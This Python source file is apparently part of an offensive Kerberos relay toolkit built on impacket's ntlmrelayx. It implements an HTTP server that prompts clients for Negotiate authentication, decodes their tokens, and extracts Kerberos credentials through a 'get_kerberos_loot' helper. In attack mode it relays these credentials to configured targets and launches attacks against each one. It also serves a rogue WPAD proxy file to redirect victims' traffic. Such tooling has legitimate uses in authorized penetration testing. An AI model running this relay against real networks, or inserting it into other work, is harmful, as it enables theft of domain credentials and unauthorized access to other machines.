import SimpleHTTPServer
import SocketServer
import socket
import base64
import random
import string
import traceback
from threading import Thread
from urlparse import urlparse

from impacket import ntlm, LOG
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers import HTTPRelayServer
from lib.utils.kerberos import get_kerberos_loot

class HTTPKrbRelayServer(HTTPRelayServer):
    """
    HTTP Kerberos relay server. Mostly extended from ntlmrelayx.
    Only required functions are overloaded
    """

    class HTTPHandler(HTTPRelayServer.HTTPHandler):
        def __init__(self,request, client_address, server):
            self.server = server
            self.protocol_version = 'HTTP/1.1'
            self.challengeMessage = None
            self.client = None
            self.machineAccount = None
            self.machineHashes = None
            self.domainIp = None
            self.authUser = None
            self.wpad = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1")) return "DIRECT"; if (dnsDomainIs(host, "%s")) return "DIRECT"; return "PROXY %s:80; DIRECT";} '
            LOG.info("HTTPD: Received connection from %s, prompting for authentication", client_address[0])
            try:
                SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
            except Exception, e:
                LOG.error(str(e))
                LOG.debug(traceback.format_exc())

        def do_GET(self):
            messageType = 0
            if self.server.config.mode == 'REDIRECT':
                self.do_SMBREDIRECT()
                return

            LOG.info('HTTPD: Client requested path: %s' % self.path.lower())

            # Serve WPAD if:
            # - The client requests it
            # - A WPAD host was provided in the command line options
            # - The client has not exceeded the wpad_auth_num threshold yet
            if self.path.lower() == '/wpad.dat' and self.server.config.serve_wpad and self.should_serve_wpad(self.client_address[0]):
                LOG.info('HTTPD: Serving PAC file to client %s' % self.client_address[0])
                self.serve_wpad()
                return

            # Determine if the user is connecting to our server directly or attempts to use it as a proxy
            if self.command == 'CONNECT' or (len(self.path) > 4 and self.path[:4].lower() == 'http'):
                proxy = True
            else:
                proxy = False

            # TODO: Handle authentication that isn't complete the first time
            if (proxy and self.headers.getheader('Proxy-Authorization') is None) or (not proxy and self.headers.getheader('Authorization') is None):
                self.do_AUTHHEAD(message='Negotiate', proxy=proxy)
                return
            else:
                if proxy:
                    auth_header = self.headers.getheader('Proxy-Authorization')
                else:
                    auth_header = self.headers.getheader('Authorization')
                try:
                    _, blob = auth_header.split('Negotiate')
                    token = base64.b64decode(blob.strip())
                except:
                    self.do_AUTHHEAD(message='Negotiate', proxy=proxy)
                    return

            # If you're looking for the magic, it's in lib/utils/kerberos.py
            authdata = get_kerberos_loot(token, self.server.config)

            # If we are here, it was succesful

            # Are we in attack mode? If so, launch attack against all targets
            if self.server.config.mode == 'ATTACK':
                self.do_attack(authdata)

            # And answer 404 not found
            self.send_response(404)
            self.send_header('WWW-Authenticate', 'Negotiate')
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length','0')
            self.send_header('Connection','close')
            self.end_headers()
            return

        def do_attack(self, authdata):
            self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
            # No SOCKS, since socks is pointless when you can just export the tickets
            # instead we iterate over all the targets
            for target in self.server.config.target.originalTargets:
                parsed_target = target
                if parsed_target.scheme.upper() in self.server.config.attacks:
                    client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
                    client.initConnection(authdata, self.server.config.dcip)
                    # We have an attack.. go for it
                    attack = self.server.config.attacks[parsed_target.scheme.upper()]
                    client_thread = attack(self.server.config, client.session, self.authUser)
                    client_thread.start()
                else:
                    LOG.error('No attack configured for %s', parsed_target.scheme.upper())
